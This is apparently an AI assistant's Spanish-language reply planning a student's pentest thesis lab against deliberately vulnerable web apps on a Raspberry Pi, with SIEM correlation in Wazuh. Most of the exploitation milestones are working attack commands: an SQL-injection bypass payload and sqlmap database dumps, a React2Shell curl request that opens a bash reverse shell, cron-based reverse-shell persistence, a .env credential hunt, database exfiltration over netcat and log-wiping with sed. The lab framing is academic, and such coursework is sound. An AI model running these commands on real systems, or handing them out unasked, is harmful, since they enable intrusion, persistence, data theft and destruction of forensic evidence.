Sí. Lo que tienes realmente son **dos versiones del mismo flujo**, una orientada al ataque puro y otra orientada a la **documentación académica + SOC/SIEM**. Para el TFG yo haría una **fusión de ambos enfoques**, porque te permitirá justificar tanto el ciclo ofensivo como el defensivo (DevSecOps + Pentesting + SIEM).

La secuencia lógica quedaría así:

# HITO #4 – Análisis de Vulnerabilidades (OpenVAS + DAST + CVE)

## Objetivo

Identificar, clasificar y documentar las vulnerabilidades presentes en las aplicaciones desplegadas en la Raspberry Pi 5.

### Herramientas

* OpenVAS / Greenbone
* OWASP ZAP
* SSL Server Test

---

## 4.1 Escaneo automatizado

### OpenVAS

```bash
gvm-start
```

Acceso:

```text
https://127.0.0.1:9392
```

Configurar un Target apuntando a:

```text
webinsegura1.duckdns.org
webinsegura2.duckdns.org
```

Perfil:

```text
Full and Fast
```

---

## 4.2 Análisis DAST

Ejecutar OWASP ZAP sobre:

```text
https://webinsegura1.duckdns.org
https://webinsegura2.duckdns.org
```

Identificar:

| Vulnerabilidad | CVE            | Severidad |
| -------------- | -------------- | --------- |
| React2Shell    | CVE-2025-55182 | Crítica   |
| React2Shell    | CVE-2025-66478 | Crítica   |
| SQL Injection  | DVWA           | Alta      |

---

## 4.3 Análisis CVSS

### React2Shell

| Campo  | Valor                                        |
| ------ | -------------------------------------------- |
| CVE    | CVE-2025-55182                               |
| CVSS   | 10.0                                         |
| Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |

Impacto:

* Ejecución remota de código
* Escalada de privilegios
* Compromiso total del sistema

---

### SQL Injection

| Campo          | Valor                                        |
| -------------- | -------------------------------------------- |
| Vulnerabilidad | SQL Injection                                |
| CVSS           | 7.5                                          |
| Vector         | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

Impacto:

* Bypass de autenticación
* Acceso a base de datos
* Exfiltración de información

---

## 4.4 SSL/TLS

Documentar:

* Certificados Let's Encrypt
* TLS 1.3
* Cipher suites
* Calificación SSL Labs

### Evidencias

✅ PDF OpenVAS
✅ Captura del CVE
✅ Captura ZAP
✅ Captura SSL Labs

---

# HITO #5 – Acceso Web Explotado (SQL Injection)

## Objetivo

Demostrar la explotación de una vulnerabilidad SQLi y la evasión del mecanismo de autenticación.

---

## 5.1 Burp Suite

Configurar proxy:

```text
127.0.0.1:8080
```

Payload:

```sql
' OR '1'='1
```

---

## 5.2 Intercepción

Capturar:

```http
POST /login.php

username=' OR '1'='1
password=test
```

Verificar:

```http
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
```

---

## 5.3 Explotación con SQLMap

```bash
sqlmap \
-u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=XXXX" \
--batch \
--dbs
```

Posteriormente:

```bash
sqlmap \
-u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=XXXX" \
-D dvwa \
--tables
```

Y finalmente:

```bash
sqlmap \
-u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=XXXX" \
-D dvwa \
-T users \
--dump
```

---

## 5.4 Correlación SIEM

Verificar en Wazuh:

```text
Rule ID 31103
```

### Evidencias

✅ Burp interceptando
✅ Login bypass
✅ SQLMap obteniendo bases de datos
✅ Alerta Wazuh SQL Injection

---

# HITO #6 – Acceso a Máquina Linux (React2Shell)

## Objetivo

Obtener ejecución remota de código sobre el backend vulnerable.

---

## 6.1 Listener

```bash
nc -lvnp 4444
```

---

## 6.2 Exploit

### Opción A

```bash
python3 react2shell_exploit.py \
--target https://webinsegura1.duckdns.org \
--lhost IP_KALI \
--lport 4444
```

### Opción B

```bash
curl \
-X POST \
-H "Content-Type: text/x-component" \
--data-binary $'1:I\n2:O{"command":"bash -c '\''bash -i >& /dev/tcp/IP/4444 0>&1'\''"}' \
https://webinsegura1.duckdns.org/api/rsc \
-k
```

---

## 6.3 Validación

Ejecutar:

```bash
whoami
id
hostname
pwd
```

Resultado esperado:

```bash
node
uid=1000(node)
```

o

```bash
www-data
uid=33(www-data)
```

---

## 6.4 Correlación SIEM

Buscar en Wazuh:

```text
Rule ID 100503
```

### Evidencias

✅ Terminal netcat
✅ whoami
✅ id
✅ Alerta crítica Wazuh

---

# HITO #7 – Post Explotación

## 7.1 Persistencia

```bash
(crontab -l 2>/dev/null; \
echo "* * * * * bash -c 'bash -i >& /dev/tcp/IP_KALI/4445 0>&1'") | crontab -
```

Verificación:

```bash
crontab -l
```

---

## 7.2 Búsqueda de credenciales

```bash
find / -name ".env" 2>/dev/null
```

```bash
cat .env
```

Buscar:

```env
DB_HOST=
DB_USER=
DB_PASSWORD=
```

---

## 7.3 Pivoteo MariaDB

```bash
mysql \
-h 172.30.0.5 \
-u db_modern_user \
-p
```

Ejecutar:

```sql
SHOW DATABASES;
USE lab_modern_db;
SHOW TABLES;
SELECT * FROM users LIMIT 5;
```

---

## 7.4 Exfiltración

```bash
tar -czf - /var/lib/mysql | nc IP_KALI 5555
```

---

## 7.5 Limpieza de huellas (SOLO DOCUMENTACIÓN)

Para el TFG es mejor **documentar la técnica** pero no ejecutarla realmente:

```bash
sed -i '/IP_KALI/d' /var/log/nginx/access.log
```

Explica:

> La técnica fue analizada con fines académicos y no ejecutada para preservar la integridad de la evidencia forense generada durante el laboratorio.

---

### Evidencias

✅ crontab -l
✅ conexión MariaDB
✅ SELECT usuarios
✅ evidencia de exfiltración
✅ explicación de anti-forensics

---

# HITO #8 – Informe Final de Pentest

La estructura profesional para el TFG debería ser:

```text
1. Resumen Ejecutivo

2. Alcance del Pentest

3. Metodología
   3.1 Reconocimiento
   3.2 Enumeración
   3.3 Análisis de vulnerabilidades
   3.4 Explotación
   3.5 Post-explotación
   3.6 Correlación SIEM

4. Hallazgos

   4.1 React2Shell
      - Descripción
      - CVE
      - CVSS
      - Evidencias
      - Impacto
      - Remediación

   4.2 SQL Injection
      - Descripción
      - CVSS
      - Evidencias
      - Impacto
      - Remediación

   4.3 Persistencia
   4.4 Exposición de credenciales

5. Matriz CVSS

6. Conclusiones

7. Recomendaciones

8. Anexos
```

# Para tu TFG, las capturas mínimas que yo haría serían:

### Hito 4

* OpenVAS mostrando CVE-2025-55182
* OWASP ZAP mostrando vulnerabilidades
* SSL Labs A/A+

### Hito 5

* Burp interceptando
* Login bypass
* SQLMap obteniendo bases
* Wazuh Rule 31103

### Hito 6

* `nc -lvnp 4444`
* `connect to`
* `whoami`
* `id`
* Wazuh Rule 100503

### Hito 7

* `crontab -l`
* `.env`
* `mysql`
* `SHOW DATABASES`
* `SELECT * FROM users`
* Exfiltración

### Hito 8

* Matriz CVSS
* Diagrama de ataque
* Timeline de compromiso
* Informe final PDF

Con esto conviertes tu TFG en un flujo completo **DevSecOps → DAST → Pentest → Post-Explotación → SIEM → Forense → Reporting**, que es precisamente lo que suele buscar un tribunal técnico.
